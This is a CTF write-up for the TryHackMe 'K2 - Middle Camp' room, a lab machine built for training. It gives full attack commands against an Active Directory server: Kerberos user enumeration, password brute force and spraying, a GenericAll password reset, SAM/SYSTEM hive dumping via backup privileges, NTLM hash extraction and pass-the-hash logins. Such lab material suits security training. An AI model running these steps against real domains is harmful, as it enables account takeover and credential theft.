---
title: "K2 - Middle Camp"
date: 2025-07-30
draft: false
summary: "Writeup for K2 - Middle Camp CTF challenge on TryHackMe."
tags: ["windows", "brute force", "misconfigured privs"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/k2-middlecamp/cover.webp"
  caption: "K2 - Middle Camp TryHackMe Challenge"
  alt: "K2 - Middle Camp cover"
platform: "TryHackMe"
---

Are you able to make your way through the mountain?
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/k2room

> This writeup covers the solution for middle camp.
> - base camp writeup: https://ziomsec.com/writeups/tryhackme/k2-basecamp/
> - summit writeup: https://ziomsec.com/writeups/tryhackme/k2-summit/

## Reconnaissance

I performed an **nmap** aggressive scan on the target to find open ports and the services running on them. This time, the system was an Active Directory server.

```shell
nmap -A -p- TARGET --min-rate 10000 -oN middle.nmap
```

![](https://cdn.ziomsec.com/k2-middlecamp/1.webp)
![](https://cdn.ziomsec.com/k2-middlecamp/2.webp)

I updated my host file with the domains : `k2.thm`, `k2server.k2.thm`

## Initial Foothold

From the **base camp**, I had recovered full names of 2 users, I used the **username-anarchy** tool to create a wordlist of potential usernames.
- https://github.com/urbanadventurer/username-anarchy

```shell
./username-anarchy -i fullnames > ../userlist2
```

![](https://cdn.ziomsec.com/k2-middlecamp/3.webp)

After creating a user list, I used **kerbrute** to bruteforce valid usernames.
- https://github.com/ropnop/kerbrute

```shell
./kerbrute userenum -d k2.thm --dc TARGET userlist2
```

![](https://cdn.ziomsec.com/k2-middlecamp/4.webp)

I added these usernames to a list. I then used the user list and the passwords recovered from the **base camp** to bruteforce valid credentials using **netexec**.

![](https://cdn.ziomsec.com/k2-middlecamp/5.webp)

I found the password for *r.bud* user.

```shell
netexec smb TARGET -u userlist2 -p creds/passlist1 --continue-on-success
```

![](https://cdn.ziomsec.com/k2-middlecamp/6.webp)

I then enumerated other users on the machine.

```shell
netexec smb TARGET -u "r.bud" -p password --users
```

![](https://cdn.ziomsec.com/k2-middlecamp/7.webp)

I then verified if *r.bud* had the permissions to access the server using **winrm** or **rdp** and connected to the target using **evil-winrm**

```shell
evil-winrm -i TARGET -u "r.bud" -p "vRMkaVgdfxhW!8"
```

![](https://cdn.ziomsec.com/k2-middlecamp/8.webp)

I found some notes in the *Documents* directory.

![](https://cdn.ziomsec.com/k2-middlecamp/9.webp)

Based on the message, I could brute force the password of *james* (`j.bold`) by creating a custom wordlist. I used **crunch** to create a wordlist with "`rockyou`" and 1 special character and 1 number.

```shell
crunch 9 9 -t rockyou^% -o passlist1
crunch 9 9 -t rockyou%^ -o passlist2
crunch 9 9 -t ^%rockyou -o passlist3
crunch 9 9 -t %^rockyou -o passlist4
cat passlist1 passlist2 passlist3 passlist4 > passlist
```

I then used the custom wordlist to bruteforce the password for *j.bold* user.

```shell
./kerbrute bruteuser --dc TARGET -d k2.thm passlist 'j.bold'
```

![](https://cdn.ziomsec.com/k2-middlecamp/10.webp)

I then used **bloodhound** for a comprehensive enumeration and to visualize the domain information.

```shell
bloodhound-python -d 'k2.thm' -u 'r.bud' -p 'vRMkaVgdfxhW!8' -c all -ns TARGET --zip
```

![](https://cdn.ziomsec.com/k2-middlecamp/11.webp)

I found something interesting. Our user *j.bold* had **GenericAll** permission over *j.smith* user.

![](https://cdn.ziomsec.com/k2-middlecamp/12.webp)

I then used **bloodyAD** to set a new password for *j.smith*.
- https://github.com/CravateRouge/bloodyAD

```shell
bloodyAD --host TARGET -d 'k2.thm' -u 'j.bold' -p '#8rockyou' set passwor 'j.smith' "password@123"

netexec smb TARGET -u 'j.smith' -p "password@123"
netexec winrm TARGET -u 'j.smith' -p "password@123"
```

![](https://cdn.ziomsec.com/k2-middlecamp/13.webp)

I then accessed the target as *j.smith*.

```shell
evil-winrm -i TARGET -u 'j.smith' -p 'password@123'
```

![](https://cdn.ziomsec.com/k2-middlecamp/14.webp)

I found the user flag from *Desktop*.

```shell
cat C:\Users\j.smith\Desktop\user.txt
```

![](https://cdn.ziomsec.com/k2-middlecamp/15.webp)

## Privilege Escalation

I viewed my permissions as found that I had **SeBackupPrivilege** and **SeRestorePrivilege**. These could be used to create a backup of any file present on the system. So, I created a backup of the SAM and SYSTEM files and downloaded it on my local system.

```shell
whoami /priv
reg save hklm\system C:\Users\j.smith\Desktop\system.bak
reg save hklm\sam C:\Users\j.smith\Desktop\sam.bak
download system.bak
download sam.bak
```

![](https://cdn.ziomsec.com/k2-middlecamp/16.webp)

I then used **impacket-secretsdump** to dump the contents and got the *administrator* NTLM hash.

```shell
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

![](https://cdn.ziomsec.com/k2-middlecamp/17.webp)

I then used the hash to access the target as *administrator*.

```shell
evil-winrm -i TARGET -u "administrator" -H "HASH"
```

![](https://cdn.ziomsec.com/k2-middlecamp/18.webp)

Finally, I captured the root flag from *administrator*'s *Desktop*.

```shell
cat C:\Users\Administrator\Desktop\root.txt
```

![](https://cdn.ziomsec.com/k2-middlecamp/19.webp)

With this, I pwned the middle camp as well. So, I finally move on to the summit.

---
